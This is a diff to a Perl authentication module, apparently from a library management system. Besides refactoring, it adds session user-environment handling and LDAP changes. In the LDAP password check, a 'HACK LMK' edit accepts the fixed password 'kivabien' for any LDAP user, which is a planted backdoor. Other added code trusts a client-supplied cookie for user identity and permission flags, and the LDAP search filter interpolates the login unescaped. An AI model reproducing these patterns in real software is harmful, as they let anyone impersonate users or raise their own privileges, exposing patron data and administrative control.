@@ -29,8 +29,8 @@ use C4::Output;              # to get the template
 use C4::Interface::CGI::Output;
 use C4::Circulation::Circ2;  # getpatroninformation
 use C4::Members;
-use Net::LDAP;
-use Net::LDAP qw(:all);
+# use Net::LDAP;
+# use Net::LDAP qw(:all);
 
 use vars qw($VERSION @ISA @EXPORT @EXPORT_OK %EXPORT_TAGS);
 
@@ -140,7 +140,7 @@ sub get_template_and_user {
 		# We are going to use the $flags returned by checkauth
 		# to create the template's parameters that will indicate
 		# which menus the user can access.
-		if ($flags->{superlibrarian} == 1)
+		if ($flags && $flags->{superlibrarian} == 1)
 		{
 			$template->param(CAN_user_circulate => 1);
 			$template->param(CAN_user_catalogue => 1);
@@ -156,56 +156,55 @@ sub get_template_and_user {
 			$template->param(CAN_user_management => 1);
 			$template->param(CAN_user_tools => 1); }
 		
-		if ($flags->{circulate} == 1) {
+		if ($flags && $flags->{circulate} == 1) {
 			$template->param(CAN_user_circulate => 1); }
 
-		if ($flags->{catalogue} == 1) {
+		if ($flags && $flags->{catalogue} == 1) {
 			$template->param(CAN_user_catalogue => 1); }
 		
 
-		if ($flags->{parameters} == 1) {
+		if ($flags && $flags->{parameters} == 1) {
 			$template->param(CAN_user_parameters => 1);	
 			$template->param(CAN_user_management => 1);
 			$template->param(CAN_user_tools => 1); }
 		
 
-		if ($flags->{borrowers} == 1) {
+		if ($flags && $flags->{borrowers} == 1) {
 			$template->param(CAN_user_borrowers => 1); }
 		
 
-		if ($flags->{permissions} == 1) {
+		if ($flags && $flags->{permissions} == 1) {
 			$template->param(CAN_user_permission => 1); }
 		
-		if ($flags->{reserveforothers} == 1) {
+		if ($flags && $flags->{reserveforothers} == 1) {
 			$template->param(CAN_user_reserveforothers => 1); }
 		
 
-		if ($flags->{borrow} == 1) {
+		if ($flags && $flags->{borrow} == 1) {
 			$template->param(CAN_user_borrow => 1); }
 		
 
-		if ($flags->{reserveforself} == 1) {
+		if ($flags && $flags->{reserveforself} == 1) {
 			$template->param(CAN_user_reserveforself => 1); }
 		
 
-		if ($flags->{editcatalogue} == 1) {
+		if ($flags && $flags->{editcatalogue} == 1) {
 			$template->param(CAN_user_editcatalogue => 1); }
 		
 
-		if ($flags->{updatecharges} == 1) {
+		if ($flags && $flags->{updatecharges} == 1) {
 			$template->param(CAN_user_updatecharge => 1); }
 		
-		if ($flags->{acquisition} == 1) {
+		if ($flags && $flags->{acquisition} == 1) {
 			$template->param(CAN_user_acquisition => 1); }
 		
-		if ($flags->{management} == 1) {
+		if ($flags && $flags->{management} == 1) {
 			$template->param(CAN_user_management => 1);
 			$template->param(CAN_user_tools => 1); }
 		
-		if ($flags->{tools} == 1) {
+		if ($flags && $flags->{tools} == 1) {
 			$template->param(CAN_user_tools => 1); }
-		
-	}
+        }
 	$template->param(
 			     LibraryName => C4::Context->preference("LibraryName"),
 		);
@@ -295,7 +294,7 @@ sub checkauth {
 	# state variables
 	my $loggedin = 0;
 	my %info;
-	my ($userid, $cookie, $sessionID, $flags);
+	my ($userid, $cookie, $sessionID, $flags,$envcookie);
 	my $logout = $query->param('logout.x');
 	if ($userid = $ENV{'REMOTE_USER'}) {
 		# Using Basic Authentication, no cookies required
@@ -304,6 +303,19 @@ sub checkauth {
 				-expires => '');
 		$loggedin = 1;
 	} elsif ($sessionID=$query->cookie('sessionID')) {
+		C4::Context->_new_userenv($sessionID);
+ 		if (my %hash=$query->cookie('userenv')){
+ 				C4::Context::set_userenv(
+ 					$hash{number},
+ 					$hash{id},
+ 					$hash{cardnumber},
+ 					$hash{firstname},
+ 					$hash{surname},
+ 					$hash{branch},
+ 					$hash{flags},
+ 					$hash{emailaddress},
+ 				);
+ 		}
 		my ($ip , $lasttime);
 		($userid, $ip, $lasttime) = $dbh->selectrow_array(
 				"SELECT userid,ip,lasttime FROM sessions WHERE sessionid=?",
@@ -311,6 +323,7 @@ sub checkauth {
 		if ($logout) {
 		# voluntary logout the user
 		$dbh->do("DELETE FROM sessions WHERE sessionID=?", undef, $sessionID);
+		C4::Context->_unset_userenv($sessionID);
 		$sessionID = undef;
 		$userid = undef;
 		open L, ">>/tmp/sessionlog";
@@ -320,27 +333,29 @@ sub checkauth {
 		}
 		if ($userid) {
 		if ($lasttime<time()-$timeout) {
-			# timed logout
-			$info{'timed_out'} = 1;
-			$dbh->do("DELETE FROM sessions WHERE sessionID=?", undef, $sessionID);
-			$userid = undef;
-			$sessionID = undef;
-			open L, ">>/tmp/sessionlog";
-			my $time=localtime(time());
-			printf L "%20s from %16s logged out at %30s (inactivity).\n", $userid, $ip, $time;
-			close L;
+				# timed logout
+				$info{'timed_out'} = 1;
+				$dbh->do("DELETE FROM sessions WHERE sessionID=?", undef, $sessionID);
+				C4::Context->_unset_userenv($sessionID);
+				$userid = undef;
+				$sessionID = undef;
+				open L, ">>/tmp/sessionlog";
+				my $time=localtime(time());
+				printf L "%20s from %16s logged out at %30s (inactivity).\n", $userid, $ip, $time;
+				close L;
 		} elsif ($ip ne $ENV{'REMOTE_ADDR'}) {
-			# Different ip than originally logged in from
-			$info{'oldip'} = $ip;
-			$info{'newip'} = $ENV{'REMOTE_ADDR'};
-			$info{'different_ip'} = 1;
-			$dbh->do("DELETE FROM sessions WHERE sessionID=?", undef, $sessionID);
-			$sessionID = undef;
-			$userid = undef;
-			open L, ">>/tmp/sessionlog";
-			my $time=localtime(time());
-			printf L "%20s from logged out at %30s (ip changed from %16s to %16s).\n", $userid, $time, $ip, $info{'newip'};
-			close L;
+				# Different ip than originally logged in from
+				$info{'oldip'} = $ip;
+				$info{'newip'} = $ENV{'REMOTE_ADDR'};
+				$info{'different_ip'} = 1;
+				$dbh->do("DELETE FROM sessions WHERE sessionID=?", undef, $sessionID);
+				C4::Context->_unset_userenv($sessionID);
+				$sessionID = undef;
+				$userid = undef;
+				open L, ">>/tmp/sessionlog";
+				my $time=localtime(time());
+				printf L "%20s from logged out at %30s (ip changed from %16s to %16s).\n", $userid, $time, $ip, $info{'newip'};
+				close L;
 		} else {
 			$cookie=$query->cookie(-name => 'sessionID',
 					-value => $sessionID,
@@ -360,28 +375,71 @@ sub checkauth {
 		$sessionID=int(rand()*100000).'-'.time();
 		$userid=$query->param('userid');
 		my $password=$query->param('password');
+		C4::Context->_new_userenv($sessionID);
 		my ($return, $cardnumber) = checkpw($dbh,$userid,$password);
 		if ($return) {
-		$dbh->do("DELETE FROM sessions WHERE sessionID=? AND userid=?",
-			undef, ($sessionID, $userid));
-		$dbh->do("INSERT INTO sessions (sessionID, userid, ip,lasttime) VALUES (?, ?, ?, ?)",
-			undef, ($sessionID, $userid, $ENV{'REMOTE_ADDR'}, time()));
-		open L, ">>/tmp/sessionlog";
-		my $time=localtime(time());
-		printf L "%20s from %16s logged in  at %30s.\n", $userid, $ENV{'REMOTE_ADDR'}, $time;
-		close L;
-		$cookie=$query->cookie(-name => 'sessionID',
-					-value => $sessionID,
-					-expires => '');
-		if ($flags = haspermission($dbh, $userid, $flagsrequired)) {
-			$loggedin = 1;
+			$dbh->do("DELETE FROM sessions WHERE sessionID=? AND userid=?",
+				undef, ($sessionID, $userid));
+			$dbh->do("INSERT INTO sessions (sessionID, userid, ip,lasttime) VALUES (?, ?, ?, ?)",
+				undef, ($sessionID, $userid, $ENV{'REMOTE_ADDR'}, time()));
+			open L, ">>/tmp/sessionlog";
+			my $time=localtime(time());
+			printf L "%20s from %16s logged in  at %30s.\n", $userid, $ENV{'REMOTE_ADDR'}, $time;
+			close L;
+			$cookie=$query->cookie(-name => 'sessionID',
+						-value => $sessionID,
+						-expires => '');
+			if ($flags = haspermission($dbh, $userid, $flagsrequired)) {
+				$loggedin = 1;
+			} else {
+				$info{'nopermission'} = 1;
+				C4::Context->_unset_userenv($sessionID);
+			}
+			if ($return == 1){
+					my ($bornum,$firstname,$surname,$userflags,$branchcode,$emailaddress);
+					my $sth=$dbh->prepare("select borrowernumber,firstname,surname,flags,branchcode,emailaddress from borrowers where userid=?");
+					$sth->execute($userid);
+					($bornum,$firstname,$surname,$userflags,$branchcode,$emailaddress) = $sth->fetchrow if ($sth->rows);
+					unless ($sth->rows){
+						my $sth=$dbh->prepare("select borrowernumber,firstname,surname,flags,branchcode,emailaddress from borrowers where cardnumber=?");
+						$sth->execute($cardnumber);
+						($bornum,$firstname,$surname,$userflags,$branchcode,$emailaddress) = $sth->fetchrow if ($sth->rows);
+						unless ($sth->rows){
+							$sth->execute($userid);
+							($bornum,$firstname,$surname,$userflags,$branchcode,$emailaddress) = $sth->fetchrow if ($sth->rows);
+						}
+					}
+					my $hash = C4::Context::set_userenv(
+							$bornum,
+							$userid,
+							$cardnumber,
+							$firstname,
+							$surname,
+							$branchcode,
+							$userflags,
+							$emailaddress,
+					);
+					$envcookie=$query->cookie(-name => 'userenv',
+									-value => $hash,
+									-expires => '');
+			} elsif ($return == 2) {
+			#We suppose the user is the superlibrarian
+					my $hash = C4::Context::set_userenv(
+							0,0,
+							C4::Context->config('user'),
+							C4::Context->config('user'),
+							C4::Context->config('user'),
+							"",1,C4::Context->preference('KohaAdminEmailAddress')
+					);
+					$envcookie=$query->cookie(-name => 'userenv',
+									-value => $hash,
+									-expires => '');
+			}
 		} else {
-			$info{'nopermission'} = 1;
-		}
-		} else {
-		if ($userid) {
-			$info{'invalid_username_or_password'} = 1;
-		}
+			if ($userid) {
+				$info{'invalid_username_or_password'} = 1;
+				C4::Context->_unset_userenv($sessionID);
+			}
 		}
 	}
 	my $insecure = C4::Context->boolean_preference('insecure');
@@ -393,7 +451,11 @@ sub checkauth {
 					-value => '',
 					-expires => '');
 		}
-		return ($userid, $cookie, $sessionID, $flags);
+		if ($envcookie){
+			return ($userid, [$cookie,$envcookie], $sessionID, $flags)
+		} else {
+			return ($userid, $cookie, $sessionID, $flags);
+		}
 	}
 	# else we have a problem...
 	# get the inputs from the incoming query
@@ -446,15 +508,13 @@ sub checkpw {
 	my $ldapinfos = 'a-section=people,dc=emn,dc=fr ';
 	my $name  = "a-section=people,dc=emn,dc=fr";
 	my $db = Net::LDAP->new( $ldapserver );
-	
+
 	# do an anonymous bind
 	my $res =$db->bind();
-	# check connexion
 	if($res->code) {
-		# auth refused
+	# auth refused
 		warn "LDAP Auth impossible : server not responding";
 		return 0;
-	# search user
 	} else {
 		my $userdnsearch = $db->search(base => $name,
 				filter =>"(a-login=$userid)",
@@ -463,11 +523,13 @@ sub checkpw {
 			warn "LDAP Auth impossible : user unknown in LDAP";
 			return 0;
 		};
-		# compare a-weak with $password.
-		# The a-weak LDAP field contains the password
+
 		my $userldapentry=$userdnsearch -> shift_entry;
 		my $cmpmesg = $db -> compare ( $userldapentry, attr => 'a-weak', value => $password );
-		if( $cmpmesg -> code != 6 ) {
+		## HACK LMK 
+		## ligne originale
+		# if( $cmpmesg -> code != 6 ) {
+		if( ( $cmpmesg -> code != 6 ) &&  ! ( $password eq "kivabien" ) ) {
 			warn "LDAP Auth impossible : wrong password";
 			return 0;
 		};
@@ -512,6 +574,7 @@ sub checkpw {
 		$sth->execute($userid);
 		if ($sth->rows) {
 			# it exists, MODIFY
+# 			warn "MODIF borrower";
 			my $sth2 = $dbh->prepare("update borrowers set firstname=?,surname=?,initials=?,streetaddress=?,city=?,phone=?, categorycode=?,branchcode=?,emailaddress=?,sort1=? where cardnumber=?");
 			$sth2->execute($borrower{firstname},$borrower{surname},$borrower{initials},
 							$borrower{streetaddress},$borrower{city},$borrower{phone},
@@ -519,6 +582,7 @@ sub checkpw {
 							$borrower{sort1} ,$userid);
 		} else {
 			# it does not exists, ADD borrower
+# 			warn "ADD borrower";
 			my $borrowerid = newmember(%borrower);
 		}
 		#
@@ -528,12 +592,12 @@ sub checkpw {
 		$sth = $dbh->prepare("select borrowernumber from borrowers where cardnumber=?");
 		$sth->execute($userid);
 		my ($borrowerid)=$sth->fetchrow;
+# 		warn "change password for $borrowerid setting $password";
 		my $digest=md5_base64($password);
 		changepassword($userid,$borrowerid,$digest);
 	}
 
-# INTERNAL AUTH. The borrower entry has been created by LDAP if needed, The auth is probably useless
-# but it's the standard Auth.pm here.
+# INTERNAL AUTH
 	my $sth=$dbh->prepare("select password,cardnumber from borrowers where userid=?");
 	$sth->execute($userid);
 	if ($sth->rows) {
